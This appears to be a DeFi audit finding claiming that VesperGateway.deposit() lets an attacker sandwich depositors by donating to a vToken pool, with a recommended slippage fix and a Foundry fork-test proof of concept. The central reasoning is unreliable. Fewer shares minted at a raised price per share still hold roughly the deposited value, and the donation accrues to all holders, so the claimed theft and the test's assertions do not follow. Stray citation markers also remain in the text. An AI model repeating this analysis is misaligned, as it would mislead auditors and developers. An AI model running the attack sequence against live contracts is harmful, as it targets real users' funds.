### Title
Vesper collateral deposits lack minimum vToken output, allowing donation-based sandwiching of depositors - (File: `contracts/VesperGateway.sol`)

### Summary
`VesperGateway.deposit()` converts a user-supplied underlying asset amount into Vesper vTokens at the vToken’s current exchange rate, but exposes no `minVTokenOut` or equivalent slippage parameter. An unprivileged attacker who already owns a sufficiently large share of the target Vesper pool can front-run the deposit by donating underlying assets to the vToken contract, increasing its price per share and reducing the number of vTokens minted to the depositor. The victim’s underlying remains in the Vesper pool, while the attacker’s existing shares retain a claim on the enlarged pool balance and can later be withdrawn for more underlying than the donation cost. [1](#0-0) 

### Finding Description
The public `deposit(IPool pool_, IVPool vToken_, uint256 amount_)` function pulls `amount_` of `vToken_.token()` from the caller, approves the vToken, and calls `vToken_.deposit(amount_)`. [2](#0-1) 

The actual amount deposited into Metronome is not the caller-requested `amount_`; it is the balance delta returned by the external Vesper deposit:

```solidity
uint256 _balanceBefore = vToken_.balanceOf(address(this));
vToken_.deposit(amount_);
uint256 _vTokenAmount = vToken_.balanceOf(address(this)) - _balanceBefore;
``` [3](#0-2) 

The gateway then deposits whatever quantity was minted and mints Metronome deposit tokens to the user:

```solidity
_depositToken.deposit(_vTokenAmount, _msgSender);
``` [4](#0-3) 

The accepted output is therefore implicitly `0`: any positive `_vTokenAmount`, no matter how far below the depositor’s expected amount, is deposited on their behalf. Unlike `SmartFarmingManager.leverage()` and `flashRepay()`, which expose explicit minimum-output checks, `VesperGateway.deposit()` contains no user-controlled bound on the vToken amount. [5](#0-4) [6](#0-5) 

The vulnerable call sequence is:

1. The attacker holds vToken shares.
2. The attacker front-runs the victim and directly transfers a large amount of the vToken’s underlying token to the Vesper pool, increasing its `pricePerShare`.
3. The victim calls `VesperGateway.deposit(pool, vToken, amount)`.
4. `vToken.deposit(amount)` mints fewer shares because each share now represents more underlying.
5. The gateway deposits only that reduced share amount into Metronome and mints fewer `msd` tokens to the victim.
6. The attacker later calls `vToken.withdraw(attackerShares)`, receiving underlying backed both by their donation and part of the victim’s deposit. [7](#0-6) 

`pool_` must be registered, but `vToken_` only needs to correspond to a configured Metronome collateral through `pool_.depositTokenOf(vToken_)`; no privileged role, malicious endpoint, faulty oracle, or attacker-controlled pool is required. [8](#0-7) [4](#0-3) 

### Impact Explanation
This causes direct loss of depositor funds. The victim supplies the full `amount_` of underlying but receives fewer vTokens, and consequently fewer `msd` collateral tokens, than they would have received at the unmanipulated exchange rate. The attacker can recover the donated capital plus a fraction of the victim’s deposited underlying according to their share of the Vesper pool. [9](#0-8) 

The invariant that breaks is deposit-value conservation: the collateral credited to the depositor should reflect the value they supplied within an explicitly accepted slippage bound, not the arbitrarily manipulated exchange rate observed during the same bundled execution. [10](#0-9) 

### Likelihood Explanation
The attack is reachable by an unprivileged EOA or contract using only public token transfers and `VesperGateway.deposit()`. The required conditions are:

- The target vToken is registered as Metronome collateral.
- Its share issuance is affected by same-transaction changes to the Vesper pool’s underlying value, such as direct donations reflected in `pricePerShare`.
- The attacker can obtain or already owns enough vToken shares to recapture the donated value plus part of the victim’s deposit.
- The victim submits a deposit without an enforceable minimum vToken amount.

The function itself provides no parameter that would let the depositor reject the manipulated mint amount. The registered-pool check does not prevent use of a legitimate deployed vToken, and the deposit path is otherwise permissionless. [8](#0-7) [11](#0-10) 

### Recommendation
Change the gateway interface to require an explicit minimum vToken output:

```solidity
function deposit(
    IPool pool_,
    IVPool vToken_,
    uint256 amount_,
    uint256 vTokenAmountMin_
) external;
```

After `vToken_.deposit(amount_)`, enforce:

```solidity
if (_vTokenAmount < vTokenAmountMin_) {
    revert VesperDepositSlippageTooHigh();
}
```

The client should calculate `vTokenAmountMin_` from the expected fair exchange rate and the depositor’s selected slippage tolerance immediately before transaction submission. This mirrors the minimum-output protection already used by the smart-farming swap paths. [12](#0-11) 

### Proof of Concept
A reproducible Foundry fork test should deploy or reference the deployed gateway, use a live Vesper vToken registered as Metronome collateral, give both the victim and attacker underlying tokens, and execute the donation/user-deposit/withdraw sequence in one forked block:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {IERC20} from "../contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";
import {IVPool} from "../contracts/interfaces/external/IVPool.sol";
import {IVesperGateway} from "../contracts/interfaces/IVesperGateway.sol";
import {IDepositToken} from "../contracts/interfaces/IDepositToken.sol";
import {IPool} from "../contracts/interfaces/IPool.sol";

contract VesperGatewayDonationSlippageForkTest is Test {
    address constant VICTIM = address(0xA11CE);
    address constant ATTACKER = address(0xB0B);

    // Populate from the selected live fork:
    IPool pool = IPool(vm.envAddress("METRONOME_POOL"));
    IVesperGateway gateway = IVesperGateway(vm.envAddress("VESPER_GATEWAY"));
    IVPool vToken = IVPool(vm.envAddress("VESPER_VTOKEN"));
    IERC20 underlying = IERC20(vToken.token());

    uint256 victimAmount = 1_000 ether;
    uint256 attackerSeedDeposit = 10_000 ether;
    uint256 donation = 10_000 ether;

    function testDonationSandwichStealsDepositorValue() public {
        IDepositToken depositToken = pool.depositTokenOf(vToken);
        require(address(depositToken) != address(0), "unregistered collateral");

        // Attacker obtains a large share position in the real Vesper pool.
        deal(address(underlying), ATTACKER, attackerSeedDeposit + donation);
        vm.startPrank(ATTACKER);
        underlying.approve(address(vToken), attackerSeedDeposit);
        vToken.deposit(attackerSeedDeposit);
        uint256 attackerShares = vToken.balanceOf(ATTACKER);
        vm.stopPrank();

        // Victim approves the Metronome gateway.
        deal(address(underlying), VICTIM, victimAmount);
        vm.prank(VICTIM);
        underlying.approve(address(gateway), victimAmount);

        // Measure fair output before manipulation.
        uint256 fairPricePerShare = vToken.pricePerShare();

        // Front-run: directly donate underlying to inflate vToken price per share.
        vm.prank(ATTACKER);
        underlying.transfer(address(vToken), donation);
        require(vToken.pricePerShare() > fairPricePerShare, "price unchanged");

        uint256 attackerUnderlyingBefore = underlying.balanceOf(ATTACKER);

        // Victim deposit executes at the manipulated rate and accepts any output.
        vm.prank(VICTIM);
        gateway.deposit(pool, vToken, victimAmount);

        uint256 victimMsdBalance = depositToken.balanceOf(VICTIM);

        // Back-run: attacker exits their shares and captures part of victimAmount.
        vm.prank(ATTACKER);
        vToken.withdraw(attackerShares);

        uint256 attackerUnderlyingAfter = underlying.balanceOf(ATTACKER);

        // Attacker receives back the donation plus value extracted from the victim.
        assertGt(attackerUnderlyingAfter, attackerUnderlyingBefore + donation);

        // The victim's credited msd balance is below fair output. For a production
        // vToken, derive the expected shares using the pre-donation pricePerShare
        // or compare against a second victim deposit made without manipulation.
        assertLt(victimMsdBalance, victimAmount);
    }
}
```

The important assertion is the comparison between the vToken amount minted at the manipulated `pricePerShare` and the amount that would have been minted before the direct transfer. On a fork, an independent baseline deposit can also be recorded in the preceding transaction to make the loss exact.
